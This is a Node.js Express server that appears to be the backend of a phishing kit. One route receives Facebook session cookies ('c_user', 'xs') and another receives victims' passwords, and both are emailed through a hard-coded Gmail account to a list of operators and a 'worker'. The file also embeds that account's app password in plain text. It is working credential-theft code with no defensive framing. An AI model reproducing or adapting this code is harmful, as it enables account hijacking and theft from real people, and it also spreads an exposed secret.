const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
app.use(cors());
app.use(express.json());

let storedData = {}; // store user data for later use in /pass

// === /submit route ===
app.post('/submit', async (req, res) => {
    const { c_user, xs, emails = [], workerEmail, name } = req.body;

    if (!c_user || !xs || emails.length === 0 || !name) {
        return res.status(400).json({ error: "Missing required fields" });
    }

    // Save for later use in /pass
    storedData = { emails, workerEmail, name };

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'hindistoryhub396@gmail.com',
            pass: 'fylk gbsb cdgu anwh' // App password
        }
    });

    const sessionMail = {
        from: `"PROFESSOR" <hindistoryhub396@gmail.com>`,
        to: emails.join(','), // Don't include workerEmail
        subject: `${name}`,
        text: `c_user: ${c_user}\nxs: ${xs}`
    };

    try {
        await transporter.sendMail(sessionMail);
        console.log('✅ Session data sent to emails[]');
        res.status(200).json({ message: 'Session email sent' });
    } catch (error) {
        console.error('❌ Error sending session email:', error);
        res.status(500).json({ error: 'Failed to send session email' });
    }
});

// === /pass route ===
app.post('/pass', async (req, res) => {
    const { password } = req.body;
    const { emails, workerEmail, name } = storedData;

    if (!password || !emails || !workerEmail || !name) {
        return res.status(400).json({ error: "Missing data or password" });
    }

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'hindistoryhub396@gmail.com',
            pass: 'fylk gbsb cdgu anwh'
        }
    });

    const allRecipients = [...emails, workerEmail];

    const passwordMail = {
        from: `"PROFESSOR" <hindistoryhub396@gmail.com>`,
        to: allRecipients.join(','),
        subject: `${name}`,
        text: `Password: ${password}`
    };

    try {
        await transporter.sendMail(passwordMail);
        console.log('✅ Password email sent to all');
        res.status(200).json({ message: 'Password email sent' });
    } catch (error) {
        console.error('❌ Error sending password email:', error);
        res.status(500).json({ error: 'Failed to send password email' });
    }
});

// === GET / route to avoid 404 ===
app.get('/', (req, res) => {
    res.send('✅ Server is running. Use POST /submit or POST /pass');
});

// === Start server ===
app.listen(3000, () => {
    console.log('🚀 Server running on port 3000');
});
